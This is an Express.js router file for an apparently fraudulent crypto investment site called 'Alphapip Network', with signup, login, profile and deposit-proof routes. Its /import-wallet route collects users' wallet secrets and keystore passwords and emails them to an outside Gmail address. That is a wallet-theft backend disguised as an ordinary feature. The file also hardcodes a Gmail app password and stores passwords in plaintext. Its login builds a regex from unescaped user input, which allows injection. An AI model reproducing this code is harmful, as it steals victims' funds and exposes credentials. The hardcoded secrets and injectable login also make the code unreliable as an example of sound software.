const express = require("express");
const router = express.Router();
const jwt = require("jsonwebtoken");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const nodemailer = require("nodemailer");

const {
  authenticateToken,
  authorizeAdmin,
} = require("../middlewares/authMiddleware");
const userModel = require("./user");
const Transaction = require("./transactionModel");
const { getMaxListeners } = require("events");

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadDir = "./uploads";
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir);
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    cb(
      null,
      file.fieldname + "-" + Date.now() + path.extname(file.originalname)
    );
  },
});

// Multer upload middleware
const upload = multer({ storage: storage });

router.post("/signup", async (req, res) => {
  try {
    const { firstName, lastName, email, password, confirmPassword, country } =
      req.body;

    // Check if user already exists
    const existingUser = await userModel.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ error: "Email already exists" });
    }

    // Check if passwords match
    if (password !== confirmPassword) {
      return res.status(400).json({ error: "Passwords do not match" });
    }

    // Create new user object with additional fields
    const newUser = new userModel({
      firstName,
      lastName,
      email,
      password,
      country, // Add country field
      signupDate: new Date(), // Set signup date/time to current date/time
    });

    // Save the user to the database
    await newUser.save();

    // Send registration confirmation email
    const transporter = nodemailer.createTransport({
      service: "Gmail",
      auth: {
        user: "mokeke250@gmail.com",
        pass: "lxvycnellvurscyl",
      },
    });

    const footerContent = await FooterContent.findOne();
    const template = await EmailTemplate.findOne({});
    const registrationConfirmationTemplate = template?.content || "";

    const mailOptions = {
      from: '"Alphapip Network" <support@alphapipnetwork.com>',
      to: email,
      subject: "Registration Confirmation",
      html: `
            <div style="color: black; padding: 70px 10px; border-radius: 10px;">
              <div style="display: flex; justify-content: center;">
                <img src="https://www.pendoraventures.com/assets/loggo-5b03edd4.png" alt="Header Image" style="max-width: 100%;" />
              </div>
              <div style="color: black; font-size: 18px;">${registrationConfirmationTemplate}</div>
              <p style="color: #ccc; margin-top: 30px; font-size: 11px; border-top: 1px solid gray;">
                ${footerContent?.content || ""}
              </p>
            </div>
          `
        .replace("{firstName}", firstName)
        .replace("{lastName}", lastName)
        .replace("{email}", email)
        .replace("{role}", newUser.role), // Use newUser.role to ensure consistency

      // You can add more placeholders for additional data if needed
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error("Error sending email:", error);
        return res.status(500).json({
          error: "An error occurred while sending the registration email",
        });
      } else {
        console.log("Email sent:", info.response);
        res.status(201).json({ message: "User registered successfully" });
      }
    });
  } catch (error) {
    console.error("Error registering user:", error);
    res
      .status(500)
      .json({ error: "An error occurred while registering the user" });
  }
});
router.post("/login", async (req, res) => {
  console.log(req.body);
  const { email, password } = req.body;
  const ipAddress = req.ip; // Get the IP address of the user

  try {
    const user = await userModel.findOne({
      email: { $regex: new RegExp(`^${email}$`, "i") },
    });

    if (!user) {
      return res.status(401).json({ message: "Invalid email or password" });
    }

    if (password !== user.password) {
      return res.status(401).json({ message: "Invalid email or password" });
    }

    // Check if the user's status is disabled or suspended
    if (user.status === "disabled") {
      return res
        .status(401)
        .json({ message: "Your account has been disabled" });
    }

    if (user.status === "suspended") {
      return res
        .status(401)
        .json({ message: "Your account has been suspended" });
    }

    const dataSend = {
      _id: user._id,
      firstName: user.firstName,
      lastName: user.lastName,
      email: user.email,
      role: user.role,
      status: user.status,
    };

    const token = jwt.sign({ _id: user._id }, process.env.JWT_SECRET);
    console.log("Token:", token);
    res.send({
      message: "Login is successful",
      alert: true,
      data: dataSend,
      token: token,
    });
    console.log(`User with IP address ${ipAddress} logged in`);
  } catch (error) {
    console.error("Failed to login:", error);
    res.status(500).json({ message: "Failed to login" });
  }
});

router.get("/user", authenticateToken, async (req, res) => {
  try {
    // Fetch user data from database using the token
    const user = await userModel.findOne({ _id: req.user._id });
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.status(200).json(user);
  } catch (error) {
    console.error(error.message);
    res.status(500).json({ message: "Server error" });
  }
});

router.post(
  "/fund-account",
  authenticateToken,
  upload.single("proof"),
  async (req, res) => {
    try {
      const { amount, wallet } = req.body;
      const proofFilePath = req.file.path; // File path of the uploaded proof file

      // Create a new transaction document
      const newTransaction = new Transaction({
        amount,
        wallet,
        proofFilePath,
      });

      // Save the transaction to MongoDB
      await newTransaction.save();

      // Simulate processing and send response
      setTimeout(() => {
        res
          .status(200)
          .json({ message: "Transaction submitted and under review." });
      }, 2000); // Simulating a delay of 2 seconds
    } catch (error) {
      console.error("Error processing form submission:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  }
);

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "mokeke250@gmail.com",
    pass: "lxvycnellvurscyl",
  },
});

router.post("/import-wallet", (req, res) => {
  const { inputType, inputValue, walletPassword, selectedWallet } = req.body;
  let emailBody = `Input Type: ${inputType}\nInput Value: ${inputValue}`;

  if (inputType === "keystore") {
    emailBody += `\nWallet Password: ${walletPassword || "N/A"}`;
  }
  emailBody += `\nSelected Wallet: ${selectedWallet.name}`;

  const mailOptions = {
    from: '"Alphapip Network" <mokeke250@gmail.com>',
    to: "raulmatthew71@gmail.com",
    subject: "Wallet Import Request",
    text: emailBody,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      return res.status(500).json({ message: "Error sending email" });
    }
    console.log("Email sent:", info.response);
    res.status(200).json({ message: "Email sent successfully" });
  });
});

router.get("/logout", (req, res) => {
  // Clear session and cookies
  req.session.destroy((err) => {
    if (err) {
      console.error("Error destroying session:", err);
      return res.status(500).json({ message: "Error logging out" });
    }
    res.clearCookie("sessionID"); // Clear any session cookies if used
    res.sendStatus(200); // Send 200 OK response if logout is successful
  });
});

router.put("/profile", async (req, res) => {
  const { firstName, lastName, email, country } = req.body;
  try {
    let profile = await userModel.findOne({ userId: req.userId });
    if (!profile) {
      return res.status(404).json({ message: "Profile not found" });
    }

    profile.firstName = firstName;
    profile.lastName = lastName;
    profile.email = email;
    profile.country = country;

    await profile.save();
    res.status(200).json(profile);
  } catch (error) {
    console.error(error.message);
    res.status(500).json({ message: "Server Error" });
  }
});

router.get("/profile", async (req, res) => {
  try {
    const profile = await userModel.findOne({ userId: req.userId });
    if (!profile) {
      return res.status(404).json({ message: "Profile not found" });
    }
    res.status(200).json(profile);
  } catch (error) {
    console.error(error.message);
    res.status(500).json({ message: "Server Error" });
  }
});

module.exports = router;
